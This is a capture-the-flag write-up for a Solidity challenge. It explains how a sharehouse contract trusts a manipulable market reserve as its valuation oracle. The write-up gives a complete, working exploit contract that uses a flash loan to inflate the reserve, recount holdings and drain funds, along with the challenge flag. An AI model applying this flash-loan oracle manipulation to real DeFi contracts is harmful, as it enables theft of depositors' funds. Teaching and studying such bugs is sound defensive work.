# Caldrin's Day Away Writeup

## Challenge summary

This challenge gives us a small DeFi-like system dressed up as a dockside
sharehouse.

People deposit **CROWN** tokens into the sharehouse and receive claim marks.
Later, they can redeem those marks for their share of the tokens in the
sharehouse. Our goal is to make the following check return `true`:

```solidity
function isSolved() external view returns (bool) {
    return crownCoin.balanceOf(address(sharehouse)) < 150_000e6;
}
```

The sharehouse begins with 1,000,000 CROWN, so we need to withdraw more than
850,000 of it.

## The important contracts

There are several contracts, but only four really matter:

- `DocksideSharehouse` holds the money and issues claim marks.
- `DocksideMarket` is an automated CROWN/SALT exchange.
- `GoldhandCredit` provides a 90,000,000 CROWN flash loan.
- `PublicStampDesk` approves an order that the sharehouse uses to recount its
  holdings.

The player can also claim a small travel purse containing 10,000 CROWN.

## How the sharehouse works

When we make a deposit, the sharehouse calculates our new claim marks using:

```solidity
claimMarkAmount =
    (crownCoinAmount * totalClaimMarks) / recordedHoldings;
```

When we withdraw, it performs the reverse calculation:

```solidity
crownCoinAmount =
    (claimMarkAmount * recordedHoldings) / totalClaimMarks;
```

In plain English:

- A low `recordedHoldings` value lets us buy lots of claim marks cheaply.
- A high `recordedHoldings` value makes those same marks redeem for much more.

Therefore, if we can buy marks at the normal valuation and then falsely
increase `recordedHoldings`, we can withdraw far more than we deposited.

## The actual bug

The setup approves one public recount order:

```solidity
function buildPublicRecountOrder() public view returns (bytes memory) {
    bytes memory callData =
        abi.encodeWithSelector(
            DocksideMarket.valueCargoAsOneGood.selector,
            SHAREHOUSE_CARGO_POSITION,
            int128(0)
        );

    return abi.encode(address(quayMarket), callData);
}
```

That order calls the following market function:

```solidity
function valueCargoAsOneGood(
    uint256 cargoMarkAmount,
    int128 good
) external view returns (uint256) {
    uint256 reserve = good == 0 ? crownReserve : saltReserve;
    return (cargoMarkAmount * reserve) / totalCargoMarks;
}
```

The position size and total cargo marks are both 1,000,000, so the result is
effectively just the market's current `crownReserve`.

The stamp desk approves the **question being asked**, but it does not approve a
fixed answer. A real-world comparison would be signing a note that says, “Use
today's market price,” rather than signing a note containing a specific price.
Anyone who can temporarily manipulate the market can change the answer returned
by the already approved order.

The sharehouse blindly trusts that answer:

```solidity
function recountHoldings(bytes calldata stampedOrder) external {
    bytes memory result = stampDesk.readStampedOrder(stampedOrder);
    uint256 newHoldings = abi.decode(result, (uint256));
    recordedHoldings = newHoldings;
}
```

This gives us a classic manipulable spot-price oracle.

## The attack plan

### 1. Buy claim marks at the honest price

We first take the 10,000 CROWN travel purse and deposit almost all of it.

This must happen before the flash loan because `leaveGoods()` contains:

```solidity
require(
    goldhandCredit.activeBorrower() == address(0),
    "LOAN_ACTIVE"
);
```

At this point, the sharehouse's recorded holdings are still around one million,
so our deposit buys roughly 9,900 claim marks.

### 2. Borrow 90 million CROWN

`GoldhandCredit` lets us borrow all 90,000,000 CROWN for one callback, as long
as we return it before the callback ends.

### 3. Temporarily inflate the market reserve

Inside the flash-loan callback, we trade all 90,000,000 borrowed CROWN for
SALT.

The market began with a 1,000,000 CROWN reserve. After our trade, its recorded
CROWN reserve becomes:

```text
1,000,000 + 90,000,000 = 91,000,000 CROWN
```

### 4. Recount while the market is manipulated

While the reserve says 91 million, we call:

```solidity
sharehouse.recountHoldings(setup.buildPublicRecountOrder());
```

The order is correctly stamped, so the stamp desk accepts it. It reads the
manipulated market reserve and changes the sharehouse's `recordedHoldings` to
91,000,000 CROWN.

The sharehouse does not actually contain that much money. Only its accounting
number has changed.

### 5. Undo the trade and repay the loan

We trade all the SALT back into CROWN. The exchange has no fee, so we recover
almost the entire loan.

There is a tiny integer-rounding loss:

```text
Borrowed:  90,000,000.000000 CROWN
Recovered: 89,999,999.999910 CROWN
Difference:        0.000090 CROWN
```

For that reason, the exploit keeps 100 token base units (`0.000100 CROWN`) out
of the original travel-purse deposit. That covers the 90-base-unit loss and
allows the flash loan to be repaid.

Importantly, reversing the market trade does **not** fix the sharehouse's
accounting. Its `recordedHoldings` value remains stuck at 91 million.

### 6. Redeem the cheaply purchased marks

Finally, we redeem all our claim marks using the fake 91-million-CROWN
valuation.

The withdrawal pays:

```text
900,990.090089 CROWN
```

The sharehouse is left with:

```text
109,009.909811 CROWN
```

That is comfortably below the required 150,000 CROWN threshold.

## Exploit contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Setup} from "./challenge/Setup.sol";
import {TradeToken} from "./challenge/TradeToken.sol";
import {DocksideMarket} from "./challenge/DocksideMarket.sol";
import {DocksideSharehouse} from "./challenge/DocksideSharehouse.sol";
import {GoldhandCredit} from "./challenge/GoldhandCredit.sol";
import {IQuayBorrower} from "./challenge/IQuayBorrower.sol";

contract CaldrinExploit is IQuayBorrower {
    uint256 private constant FLASH_AMOUNT = 90_000_000e6;
    uint256 private constant REPAYMENT_DUST = 100;

    Setup public immutable setup;
    TradeToken public immutable crown;
    TradeToken public immutable salt;
    DocksideMarket public immutable market;
    GoldhandCredit public immutable lender;
    DocksideSharehouse public immutable sharehouse;

    constructor(address setupAddress) {
        setup = Setup(setupAddress);
        crown = setup.crownCoin();
        salt = setup.saltGoods();
        market = setup.quayMarket();
        lender = setup.goldhandCredit();
        sharehouse = setup.sharehouse();
    }

    function attack() external {
        setup.takeTravelPurse();

        crown.approve(address(sharehouse), type(uint256).max);
        sharehouse.leaveGoods(setup.TRAVEL_PURSE() - REPAYMENT_DUST);

        lender.borrowForOneCall(FLASH_AMOUNT, "");

        sharehouse.redeemClaim(
            sharehouse.claimMarks(address(this))
        );

        require(setup.isSolved(), "NOT_SOLVED");
    }

    function onQuayLoan(
        uint256 amount,
        bytes calldata
    ) external {
        require(msg.sender == address(lender), "NOT_LENDER");
        require(amount == FLASH_AMOUNT, "BAD_AMOUNT");

        crown.approve(address(market), type(uint256).max);
        uint256 saltOut = market.trade(0, 1, amount, 0);

        sharehouse.recountHoldings(
            setup.buildPublicRecountOrder()
        );

        salt.approve(address(market), type(uint256).max);
        market.trade(1, 0, saltOut, 0);

        crown.transfer(address(lender), amount);
    }
}
```

## Running it

The included `solve.sh` builds the contract, deploys it, calls `attack()`, and
checks `isSolved()`:

```bash
export RPC_URL='http://challenge-rpc/...'
export PRIVATE_KEY='0x...'
export SETUP_ADDRESS='0x...'

./solve.sh
```

The final check returned:

```text
Solved: true
```

## Flag

```text
HTB{inquir3y_0ne_c4ldr1n_s0lv3d_f91f16f39a20a60c10361d75ae9b359d}
```

## Takeaway

The interesting mistake was not in the flash-loan contract itself. The real
problem was treating a live, easily manipulated market reserve as a trustworthy
valuation.

Approving calldata does not make the returned value safe. If an approved call
reads mutable market state, an attacker may be able to change that state for
one transaction, record the fake result somewhere else, and then restore the
market before repaying the loan.
